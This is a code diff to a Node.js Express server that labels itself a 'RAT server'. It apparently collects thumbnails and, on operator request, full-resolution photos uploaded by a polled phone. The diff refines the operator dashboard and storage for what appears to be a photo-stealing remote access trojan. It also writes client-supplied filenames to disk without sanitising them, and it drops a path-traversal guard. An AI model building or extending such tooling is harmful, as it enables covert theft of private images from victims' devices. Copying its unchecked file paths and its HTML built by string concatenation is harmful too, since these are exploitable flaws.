@@ -14,19 +14,19 @@ app.use(express.urlencoded({ extended: true }));
 // ─── Directories ────────────────────────────────────────────────────
 
 const uploadDir = './uploads';
-const fullsizeDir = './uploads/fullsize';
+const fullResDir = './full_res';
 
 if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
-if (!fs.existsSync(fullsizeDir)) fs.mkdirSync(fullsizeDir, { recursive: true });
+if (!fs.existsSync(fullResDir)) fs.mkdirSync(fullResDir, { recursive: true });
 
 app.use('/uploads', express.static(uploadDir));
+app.use('/full_res', express.static(fullResDir));
 
 // ─── Request queue (in-memory + file persistence) ───────────────────
 
 const requestsFile = path.join(uploadDir, 'requests.json');
 let pendingRequests = [];
 
-// Load existing requests on startup
 if (fs.existsSync(requestsFile)) {
     try {
         pendingRequests = JSON.parse(fs.readFileSync(requestsFile, 'utf8'));
@@ -65,7 +65,7 @@ app.post('/api/upload/thumbnail', (req, res) => {
     }
 });
 
-// ─── API: Full-size image upload ────────────────────────────────────
+// ─── API: Full-res image upload ─────────────────────────────────────
 
 app.post('/api/upload/fullsize', (req, res) => {
     try {
@@ -73,10 +73,10 @@ app.post('/api/upload/fullsize', (req, res) => {
         const imageData = image.split(',')[1] || image;
         const buffer = Buffer.from(imageData, 'base64');
 
-        const fullPath = path.join(fullsizeDir, filename);
+        const fullPath = path.join(fullResDir, filename);
         fs.writeFileSync(fullPath, buffer);
 
-        console.log('🖼️  Full image received:', filename, '(' + Math.round(buffer.length / 1024) + ' KB)');
+        console.log('🖼️  Full-res saved to ./full_res/' + filename + ' (' + Math.round(buffer.length / 1024) + ' KB)');
         res.json({ success: true, filename });
     } catch (error) {
         console.error('Error uploading full image:', error);
@@ -101,18 +101,15 @@ app.get('/api/thumbnails', (req, res) => {
                         fs.readFileSync(path.join(uploadDir, metaFile), 'utf8'));
                 } catch (e) {}
 
-                // Check if full-size version exists
-                const hasFullsize = fs.existsSync(
-                    path.join(fullsizeDir, metadata.originalName));
-
-                // Check if request is pending
+                const hasFullRes = fs.existsSync(
+                    path.join(fullResDir, metadata.originalName));
                 const isPending = pendingRequests.includes(metadata.originalName);
 
                 thumbnails.push({
                     name: metadata.originalName,
                     thumbnail: file,
                     uploadedAt: metadata.uploadedAt,
-                    hasFullsize,
+                    hasFullRes,
                     isPending
                 });
             }
@@ -121,49 +118,26 @@ app.get('/api/thumbnails', (req, res) => {
         thumbnails.sort((a, b) => new Date(b.uploadedAt) - new Date(a.uploadedAt));
         res.json({ thumbnails });
     } catch (error) {
-        console.error('Error fetching thumbnails:', error);
         res.status(500).json({ success: false, error: 'Failed to fetch thumbnails' });
-    }
-});
-
-// ─── API: Full-size image serving ───────────────────────────────────
-
-app.get('/api/fullsize/:filename', (req, res) => {
-    try {
-        const { filename } = req.params;
-        // Prevent path traversal
-        const safeName = path.basename(filename);
-        const fullPath = path.join(fullsizeDir, safeName);
-
-        if (fs.existsSync(fullPath)) {
-            res.download(fullPath, safeName);
-        } else {
-            res.status(404).json({ error: 'Full-size image not available' });
-        }
-    } catch (error) {
-        res.status(500).json({ error: 'Failed to serve image' });
     }
 });
 
 // ─── API: Request queue ─────────────────────────────────────────────
 
-// Get pending requests (polled by phone)
 app.get('/api/requests', (req, res) => {
     res.json({ requests: pendingRequests });
 });
 
-// Add a request (from dashboard click)
 app.post('/api/request/:filename', (req, res) => {
     const filename = decodeURIComponent(req.params.filename);
     if (!pendingRequests.includes(filename)) {
         pendingRequests.push(filename);
         saveRequests();
-        console.log('📋 Full image requested:', filename);
+        console.log('📋 Full-res requested:', filename);
     }
     res.json({ success: true, pending: pendingRequests.length });
 });
 
-// Remove a fulfilled request (from phone after upload)
 app.delete('/api/request/:filename', (req, res) => {
     const filename = decodeURIComponent(req.params.filename);
     pendingRequests = pendingRequests.filter(f => f !== filename);
@@ -242,11 +216,10 @@ app.get('/', (req, res) => {
             font-size: 11px; white-space: nowrap;
             overflow: hidden; text-overflow: ellipsis;
         }
-        .thumb .actions { display: flex; gap: 4px; }
         .btn {
             padding: 4px 8px; border: none; border-radius: 3px;
             font-size: 10px; cursor: pointer; font-weight: 600;
-            transition: background 0.2s;
+            transition: background 0.2s; text-align: center;
         }
         .btn-request {
             background: #2563eb; color: white;
@@ -256,10 +229,10 @@ app.get('/', (req, res) => {
             background: #854d0e; color: #fbbf24;
             cursor: wait;
         }
-        .btn-download {
-            background: #15803d; color: white;
+        .btn-saved {
+            background: #15803d; color: #86efac;
+            cursor: default;
         }
-        .btn-download:hover { background: #166534; }
         .empty {
             grid-column: 1 / -1;
             text-align: center; padding: 80px 20px;
@@ -298,10 +271,10 @@ app.get('/', (req, res) => {
             setTimeout(() => t.classList.remove('show'), 2000);
         }
 
-        async function requestFullImage(filename) {
+        async function requestFullRes(filename) {
             try {
                 await fetch('/api/request/' + encodeURIComponent(filename), { method: 'POST' });
-                showToast('Requested: ' + filename);
+                showToast('Requested full-res: ' + filename);
                 lastHash = '';
                 loadThumbnails();
             } catch (e) {
@@ -322,18 +295,17 @@ app.get('/', (req, res) => {
                     const latestTime = latest.uploadedAt
                         ? new Date(latest.uploadedAt).toLocaleString()
                         : 'unknown';
+                    const saved = data.thumbnails.filter(t => t.hasFullRes).length;
                     const pending = data.thumbnails.filter(t => t.isPending).length;
-                    const fullsize = data.thumbnails.filter(t => t.hasFullsize).length;
 
-                    let statusText = count + ' images captured';
+                    let statusText = count + ' thumbnails';
+                    if (saved > 0) statusText += ' · ' + saved + ' full-res saved';
                     if (pending > 0) statusText += ' · ' + pending + ' pending';
-                    if (fullsize > 0) statusText += ' · ' + fullsize + ' full-size ready';
                     statusText += ' — latest: ' + latestTime;
                     stats.textContent = statusText;
 
-                    // Build hash to avoid unnecessary DOM rebuilds
                     const newHash = data.thumbnails.map(t =>
-                        t.name + t.hasFullsize + t.isPending).join('|');
+                        t.name + t.hasFullRes + t.isPending).join('|');
 
                     if (newHash !== lastHash) {
                         gallery.innerHTML = '';
@@ -342,23 +314,21 @@ app.get('/', (req, res) => {
                             div.className = 'thumb';
 
                             let actionBtn = '';
-                            if (thumb.hasFullsize) {
-                                actionBtn = '<a class="btn btn-download" href="/api/fullsize/' +
-                                    encodeURIComponent(thumb.name) +
-                                    '" download>⬇ Download</a>';
+                            if (thumb.hasFullRes) {
+                                actionBtn = '<span class="btn btn-saved">✓ Saved to full_res</span>';
                             } else if (thumb.isPending) {
-                                actionBtn = '<span class="btn btn-pending">⏳ Pending</span>';
+                                actionBtn = '<span class="btn btn-pending">⏳ Waiting for device</span>';
                             } else {
-                                actionBtn = '<button class="btn btn-request" onclick="event.stopPropagation();requestFullImage(\\'' +
+                                actionBtn = '<button class="btn btn-request" onclick="event.stopPropagation();requestFullRes(\\'' +
                                     thumb.name.replace(/'/g, "\\\\'") +
-                                    '\\')">📥 Request Full</button>';
+                                    '\\')">📥 Get Full Res</button>';
                             }
 
                             div.innerHTML =
                                 '<img src="/uploads/' + thumb.thumbnail + '" alt="' + thumb.name + '">' +
                                 '<div class="overlay">' +
                                 '<div class="name">' + thumb.name + '</div>' +
-                                '<div class="actions">' + actionBtn + '</div>' +
+                                actionBtn +
                                 '</div>';
                             gallery.appendChild(div);
                         });
@@ -387,7 +357,7 @@ app.get('/', (req, res) => {
 // ─── Server startup ─────────────────────────────────────────────────
 
 app.listen(port, '0.0.0.0', () => {
-    console.log(`🐀 RAT server running at http://localhost:${port}`);
+    console.log('🐀 RAT server running at http://localhost:' + port);
 });
 
 process.on('SIGINT', () => {
